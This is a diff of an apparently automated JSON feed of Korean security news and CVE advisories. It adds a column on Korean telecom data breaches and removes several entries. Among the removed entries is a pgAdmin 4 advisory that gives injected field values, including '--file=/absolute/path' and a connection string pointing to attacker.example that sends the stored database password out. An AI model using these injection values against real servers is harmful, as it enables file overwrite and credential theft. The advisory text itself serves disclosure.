@@ -1,6 +1,18 @@
 {
-  "fetched_at": "2026-09-21T00:01:32.598661+09:00",
+  "fetched_at": "2026-09-21T00:31:21.486818+09:00",
   "security_news": [
+    {
+      "title": "[데스크 칼럼] 이런 불길한 미래가 오지 말란 법이 없다",
+      "summary": "SK텔레콤 가입자 주요 정보 등 2324만 건이 해킹으로 유출됐고, KT 이용자들은 가짜 기지국을 활용한 소액결제 사건으로 한동안 불안에 떨었다. GS리테일은 편의점, 홈쇼핑 사이트에서 개인정보 166만 건이 유출돼 최근...",
+      "content": "",
+      "title_ko": null,
+      "summary_ko": null,
+      "summary_3lines": "1. SKT 2324만 건, GS리테일 166만 건 정보 유출\n2. KT는 가짜 기지국 통한 소액결제 사건 발생\n3. 유출 정보로 인한 개인정보 피해 지속 우려",
+      "link": "https://www.fntimes.com/html/view.php?ud=202609182300197374dd55077bc2_18",
+      "source": "naver",
+      "published": "2026-09-21T00:02:00+09:00",
+      "lang": "ko"
+    },
     {
       "title": "[최경진의 未來法道] 프런티어 AI 시대, 한국 답은 검증 가능한 가속",
       "summary": "현행 AI 기본법을 토대로 출시 전에는 능력·영향 기반 시험, 독립 레드팀, 제3자 검증, 개인정보·사이버보안 평가와 단계적 공개를 구체화하고 실천해 나가야 한다. 출시 후에는 지속적 모니터링, 중대사고 보고, 감사...",
@@ -1476,18 +1488,6 @@
       "source": "naver",
       "published": "2026-09-18T06:00:00+09:00",
       "lang": "ko"
-    },
-    {
-      "title": "인간 몰래 해킹한다… AI 고도화에 ‘스카이넷 현실화’ 경고음",
-      "summary": "사이버 보안 현장에서의 경고음은 이미 나오고 있다. AI가 악성코드 제작 등 인간의 해킹을 지원하는 수준을... 젠슨 황 엔비디아 최고경영자(CEO)도 최근 사이버 보안을 AI의 다음 거대 시장으로 꼽았다. 공격자가 AI를...",
-      "content": "",
-      "title_ko": null,
-      "summary_ko": null,
-      "summary_3lines": "1. AI, 엔비디아 CEO도 주목한 사이버 보안 시장\n2. AI, 악성코드 제작 지원 등 해킹 방식 고도화\n3. 스카이넷 현실화 우려, AI 보안 시장 급성장",
-      "link": "https://n.news.naver.com/mnews/article/005/0001873708?sid=101",
-      "source": "naver",
-      "published": "2026-09-18T00:06:00+09:00",
-      "lang": "ko"
     }
   ],
   "vulnerability": [
@@ -2164,36 +2164,6 @@
       "link": "https://cvefeed.io/vuln/detail/CVE-2026-85715",
       "source": "cvefeed",
       "published": "2026-09-18T00:33:02+09:00",
-      "lang": "en"
-    },
-    {
-      "title": "CVE-2026-86864 - pgAdmin 4: Argument and connection-string injection via the database field in the Backup tool",
-      "summary": "CVE ID :CVE-2026-86864\n  \nPublished : Sept. 17, 2026, 3:31 p.m. | 31 minutes ago\n  \nDescription :pgAdmin 4's Backup tool appended the client-supplied 'database' field from the /backup/job//object request to the pg_dump argument vector as a bare trailing positional argument, without validation. Because pg_dump parses its options with getopt_long, which permutes arguments, a value beginning with a dash was interpreted as an option rather than as a database name. A value such as --file=/absolute/path therefore overrode the storage-confined --file that pgAdmin had constructed earlier, causing pg_dump to write its output anywhere the pgAdmin process could write, outside the user's File Manager storage directory. This yields arbitrary file creation and overwrite as the operating-system account running pgAdmin, which can destroy pgAdmin's own configuration database and, depending on the target chosen, be escalated further.\n\nThe same field additionally permitted connection-string injection. libpq expands a database name containing an equals sign into a full connection string, and keywords embedded there override the --host and --port that pgAdmin passes, so a value such as 'host=attacker.example port=5432 dbname=x' redirected pg_dump to a server of the attacker's choosing. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection carries that credential to the attacker-nominated endpoint. Both behaviours are reachable by any authenticated user holding the tools_backup permission, which is granted to the default User role.\n\nThe fix stops passing the database name through the argument vector altogether and supplies it in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. This matches the approach already used by the Import/Export tool. Regression tests assert that the database name is absent from the constructed argument vector and that PGDATABASE carries the exact requested value.\n\nThis issue affects pgAdmin 4: from the introduction of the trailing positional database argument in the Backup tool before 9.18.\n  \nSeverity: 8.8 | HIGH\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "description": "CVE ID :CVE-2026-86864\n  \nPublished : Sept. 17, 2026, 3:31 p.m. | 31 minutes ago\n  \nDescription :pgAdmin 4's Backup tool appended the client-supplied 'database' field from the /backup/job//object request to the pg_dump argument vector as a bare trailing positional argument, without validation. Because pg_dump parses its options with getopt_long, which permutes arguments, a value beginning with a dash was interpreted as an option rather than as a database name. A value such as --file=/absolute/path therefore overrode the storage-confined --file that pgAdmin had constructed earlier, causing pg_dump to write its output anywhere the pgAdmin process could write, outside the user's File Manager storage directory. This yields arbitrary file creation and overwrite as the operating-system account running pgAdmin, which can destroy pgAdmin's own configuration database and, depending on the target chosen, be escalated further.\n\nThe same field additionally permitted connection-string injection. libpq expands a database name containing an equals sign into a full connection string, and keywords embedded there override the --host and --port that pgAdmin passes, so a value such as 'host=attacker.example port=5432 dbname=x' redirected pg_dump to a server of the attacker's choosing. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection carries that credential to the attacker-nominated endpoint. Both behaviours are reachable by any authenticated user holding the tools_backup permission, which is granted to the default User role.\n\nThe fix stops passing the database name through the argument vector altogether and supplies it in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. This matches the approach already used by the Import/Export tool. Regression tests assert that the database name is absent from the constructed argument vector and that PGDATABASE carries the exact requested value.\n\nThis issue affects pgAdmin 4: from the introduction of the trailing positional database argument in the Backup tool before 9.18.\n  \nSeverity: 8.8 | HIGH\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "title_ko": null,
-      "summary_ko": null,
-      "summary_3lines": "1. CVE-2026-86864\n2. 26.09.18 오전12:31\n3. pgAdmin 4's Backup tool appended the client-suppli",
-      "cve_id": "CVE-2026-86864",
-      "cvss": "",
-      "severity": "",
-      "link": "https://cvefeed.io/vuln/detail/CVE-2026-86864",
-      "source": "cvefeed",
-      "published": "2026-09-18T00:31:00+09:00",
-      "lang": "en"
-    },
-    {
-      "title": "CVE-2026-91039 - dynamic_oidc identities are not namespaced by connection in ash_authentication, allowing cross-connection account takeover",
-      "summary": "CVE ID :CVE-2026-91039\n  \nPublished : Sept. 17, 2026, 3:19 p.m. | 43 minutes ago\n  \nDescription :Authentication Bypass by Spoofing vulnerability in team-alembic ash_authentication allows an attacker who operates one identity-provider connection of a dynamic_oidc strategy to be signed in as a local user established through a different connection.\n\nThe strategy is meant to keep each connection in its own identity namespace by writing every UserIdentity row's strategy field as \"/\", but that namespacing never takes effect. __connection_id__ is populated only on the ephemeral runtime struct built per request in dynamic_oidc/plug.ex, and DynamicOidc.IdentityChange.change/3 re-fetches the strategy from the compile-time DSL through Info.strategy_for_action, yielding the persisted struct whose __connection_id__ is its defstruct default of nil. OAuth2.identity_strategy_name/1 therefore falls back to the bare strategy name for both the identity write and the reads in oauth2/user_resolver.ex and oauth2/sign_in_preparation.ex. Since the identity resource's unique key is (uid, strategy), one row exists per sub across every connection, and the identity-match branch runs before any email check. Neither strategy handles iss, so nothing else distinguishes the issuers: OpenID Connect Core section 5.7 makes sub unique only within an issuer, so two connections numbering subjects independently share one subject space.\n\nThis issue affects ash_authentication: from 5.0.0-rc.10 before 5.0.0-rc.14.\n  \nSeverity: 9.1 | CRITICAL\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "description": "CVE ID :CVE-2026-91039\n  \nPublished : Sept. 17, 2026, 3:19 p.m. | 43 minutes ago\n  \nDescription :Authentication Bypass by Spoofing vulnerability in team-alembic ash_authentication allows an attacker who operates one identity-provider connection of a dynamic_oidc strategy to be signed in as a local user established through a different connection.\n\nThe strategy is meant to keep each connection in its own identity namespace by writing every UserIdentity row's strategy field as \"/\", but that namespacing never takes effect. __connection_id__ is populated only on the ephemeral runtime struct built per request in dynamic_oidc/plug.ex, and DynamicOidc.IdentityChange.change/3 re-fetches the strategy from the compile-time DSL through Info.strategy_for_action, yielding the persisted struct whose __connection_id__ is its defstruct default of nil. OAuth2.identity_strategy_name/1 therefore falls back to the bare strategy name for both the identity write and the reads in oauth2/user_resolver.ex and oauth2/sign_in_preparation.ex. Since the identity resource's unique key is (uid, strategy), one row exists per sub across every connection, and the identity-match branch runs before any email check. Neither strategy handles iss, so nothing else distinguishes the issuers: OpenID Connect Core section 5.7 makes sub unique only within an issuer, so two connections numbering subjects independently share one subject space.\n\nThis issue affects ash_authentication: from 5.0.0-rc.10 before 5.0.0-rc.14.\n  \nSeverity: 9.1 | CRITICAL\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "title_ko": null,
-      "summary_ko": null,
-      "summary_3lines": "1. CVE-2026-91039\n2. 26.09.18 오전12:19\n3. Authentication Bypass by Spoofing vulnerability in",
-      "cve_id": "CVE-2026-91039",
-      "cvss": "",
-      "severity": "",
-      "link": "https://cvefeed.io/vuln/detail/CVE-2026-91039",
-      "source": "cvefeed",
-      "published": "2026-09-18T00:19:15+09:00",
       "lang": "en"
     }
   ],
